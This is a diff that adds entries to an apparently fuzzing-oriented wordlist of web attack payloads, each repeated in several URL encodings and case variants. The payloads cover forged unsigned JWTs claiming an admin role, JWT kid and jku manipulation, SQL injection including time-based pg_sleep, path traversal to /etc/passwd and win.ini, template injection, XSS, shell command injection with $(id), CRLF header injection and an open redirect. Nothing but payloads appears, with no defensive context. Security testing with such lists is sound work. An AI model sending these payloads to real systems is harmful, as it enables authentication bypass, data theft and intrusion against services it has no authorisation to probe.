@@ -78,3 +78,163 @@ alg=none?v=3
 alg=none&v=3
 alg%3Dnone_3
 jwt_3
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
+EYJHBGCIOIJUB25LIIWIDHLWIJOISLDUIN0.EYJYB2XLIJOIYWRTAW4IFQ.
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.?aurose=1
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.&aurose=1
+Bearer invalid.invalid.invalid
+Bearer%20invalid.invalid.invalid
+Bearer%2520invalid.invalid.invalid
+Bearer/**/invalid.invalid.invalid
+BEARER INVALID.INVALID.INVALID
+Bearer invalid.invalid.invalid?aurose=1
+Bearer invalid.invalid.invalid&aurose=1
+Bearer null
+Bearer%20null
+Bearer%2520null
+Bearer/**/null
+BEARER NULL
+Bearer null?aurose=1
+Bearer null&aurose=1
+Bearer ../../../../etc/passwd
+Bearer%20..%2F..%2F..%2F..%2Fetc%2Fpasswd
+Bearer%2520..%252F..%252F..%252F..%252Fetc%252Fpasswd
+Bearer/**/../../../../etc/passwd
+BEARER ../../../../ETC/PASSWD
+Bearer ../../../../etc/passwd?aurose=1
+Bearer ../../../../etc/passwd&aurose=1
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake
+EYJHBGCIOIJIUZI1NIJ9.EYJZDWIIOIIXIIWICM9SZSI6IMFKBWLUIN0.FAKE
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake?aurose=1
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake&aurose=1
+alg%253Dnone
+alg%3dnone
+alg=none?aurose=1
+alg=none&aurose=1
+kid%253D..%252F..%252F..%252F..%252Fdev%252Fnull
+kid%3d../../../../dev/null
+kid=../../../../dev/null?aurose=1
+kid=../../../../dev/null&aurose=1
+jku=http://127.0.0.1/jwks.json
+jku%3Dhttp%3A%2F%2F127.0.0.1%2Fjwks.json
+jku%253Dhttp%253A%252F%252F127.0.0.1%252Fjwks.json
+jku%3dhttp://127.0.0.1/jwks.json
+JKU=HTTP://127.0.0.1/JWKS.JSON
+jku=http://127.0.0.1/jwks.json?aurose=1
+jku=http://127.0.0.1/jwks.json&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.::var0
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.::v0
+/jwt/probe/0
+Bearer invalid.invalid.invalid::var1
+Bearer%20invalid.invalid.invalid::v1
+/jwt/probe/1
+Bearer null::var2
+Bearer%20null::v2
+/jwt/probe/2
+Bearer ../../../../etc/passwd::var3
+Bearer%20..%2F..%2F..%2F..%2Fetc%2Fpasswd::v3
+/jwt/probe/3
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake::var4
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake::v4
+/jwt/probe/4
+alg=none::var5
+alg%3Dnone::v5
+/jwt/probe/5
+kid=../../../../dev/null::var6
+kid%3D..%2F..%2F..%2F..%2Fdev%2Fnull::v6
+/jwt/probe/6
+jku=http://127.0.0.1/jwks.json::var7
+jku%3Dhttp%3A%2F%2F127.0.0.1%2Fjwks.json::v7
+/jwt/probe/7
+' OR '1'='1::var8
+%27%20OR%20%271%27%3D%271::v8
+/jwt/probe/8
+" OR "1"="1::var9
+%22%20OR%20%221%22%3D%221::v9
+/jwt/probe/9
+' AND 1=1 --::var10
+%27%20AND%201%3D1%20--::v10
+/jwt/probe/10
+' AND 1=2 --::var11
+%27%20AND%201%3D2%20--::v11
+/jwt/probe/11
+../../../../etc/passwd::var12
+..%2F..%2F..%2F..%2Fetc%2Fpasswd::v12
+/jwt/probe/12
